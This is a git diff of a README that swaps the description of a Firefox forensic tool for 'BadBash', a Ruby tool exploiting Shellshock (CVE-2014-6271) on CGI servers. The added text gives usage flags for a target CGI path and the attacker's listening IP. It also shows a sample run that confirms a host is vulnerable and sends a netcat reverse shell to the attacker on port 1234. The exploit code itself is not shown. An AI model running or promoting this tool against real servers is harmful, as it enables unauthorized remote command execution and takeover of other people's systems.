@@ -1,8 +1,7 @@
 ================================================================================================
 
-F0xChas3r is a forensic tool for extracting and viewing internet artifacts from Mozlila Firefox. The internet artifacts 
-include bookmark, auto-complete, download, cookie, DomStorage, history, extension and cache records. All the outputs will
-be saved into CSV file with UTC time.
+BadBash is a CVE-2014-6271 RCE tool. The basic version only checks for the HTTP CGI site and only provides netcat reverse shell on port 1234.
+
 
 Developer : Andy Yang
 Version : 0.1.0
@@ -10,57 +9,33 @@ License : GPLv3
 
 ================================================================================================
 
-RainMak3r@Could:~/Desktop# ./F0xChas3r.rb 
-
-
- ✄╭━━━┳━━━╮╱╱╭━━━┳╮╱╱╱╱╱╱╱╭━━━╮
- 
- ✄┃╭━━┫╭━╮┃╱╱┃╭━╮┃┃╱╱╱╱╱╱╱┃╭━╮┃
- ✄┃╰━━┫┃┃┃┣╮╭┫┃╱╰┫╰━┳━━┳━━╋╯╭╯┣━╮
- ✄┃╭━━┫┃┃┃┣╋╋┫┃╱╭┫╭╮┃╭╮┃━━╋╮╰╮┃╭╯
- ✄┃┃╱╱┃╰━╯┣╋╋┫╰━╯┃┃┃┃╭╮┣━━┃╰━╯┃┃  version 0.1.0
-  
-F0xChas3r - Firefox forensic tool by Andy Yang[contactayangATgmailDOTcom]; 
+RainMak3r@Could:~/Desktop# ruby BadBash.rb  -h
+   ___           _   ___          _     
+  / __\ __ _  __| | / __ __ _ ___| |__  
+ /__\/// _` |/ _` |/__\/// _` / __| '_ \ 
+/ \/  \ (_| | (_| / \/  \ (_| \__ \ | | |      Basic Version - 0.1 by Andy Yang
+\_____/\__,_|\__,_\_____/\__,_|___/_| |_|      contactayang[AT]gmail[DOT]com
+                                 
+BadBash - CVE-2014-6271 RCE tool by Andy Yang
+Basic version only checks for HTTP site
+Basic version only provides netcat reverse shell on port 1234
 
 EXAMPLE USAGE:
-     ./F0xChas3r.rb  -p '/Mozilla/Firefox/Profiles/<random text>.default' -c '/Mozilla/Firefox/profiles/<random text>.default/Cache'
-  
-    -c, --cache path                 specify user cache location.
-    -p, --profile path               specify user profile location.
-    -h, --help                       display help
-
+     ./BBash.rb  -t 'www.target.com/cgi-folder/cgi.sh' -d '127.0.0.1'
+     ./BBash.rb  -t '10.0.0.1/cgi-folder/cgi.sh' -d '127.0.0.1'
+    -t, --Target CGI path            Full path of CGI page
+    -d, --Destination IP             Your IP address that listen to an inbound connection
+    -h, --help                       Display help
 
 ================================================================================================
 Example of usage.
 ================================================================================================
-RainMak3r@Could:~/Desktop# ./F0xChas3r.rb -p '/RainMak3r/.mozilla/firefox/nq474mcm.default' -c '/RainMak3r/.mozilla/firefox/nq474mcm.default/Cache'
+RainMak3r@Could:~/Desktop#ruby BadBash.rb -t '172.16.235.140/cgi-bin/Andy.sh' -d '172.16.189.1'
 
-[Info]  F0xChas3r is chasing the Firefox for you now.
-
-[OK]	  11 bookmark records have been found.
-
-[OK]	  4 download records have been found.
-
-[OK]	  21 cookie records have been found.
-
-[OK]  	1 DOM storage records have been found.
-
-[OK]	  2 auto-complete records have been found.
-
-[Info]	Extracting web history could take a few mins.......
-
-[OK]	  97 web browsing history records have been identified.
-
-[Info]	Writing web history records to CSV file.......
-
-[OK]	  3 extension records have been found.
-
-[Info]  F0xChas3r is chasing the Firefox cache records for you now.
-
-[Info]  Extracting cache records could take a few mins.......
-
-[OK]	  112 cache records are identified.
-
-[DONE]	Please check the output CSV files for details.
+[Info]     Checking if the target is vulnerable........
+[Info]     This may take up to 10 seconds........
+[Info]     Target is vulnerable!!!
+[Info]     Please use NC to listen on port 1234 for reverse shell..........
+[Info]     Exploiting for a reverse shell to connect 172.16.189.1:1234 via netcat ..........
 
 
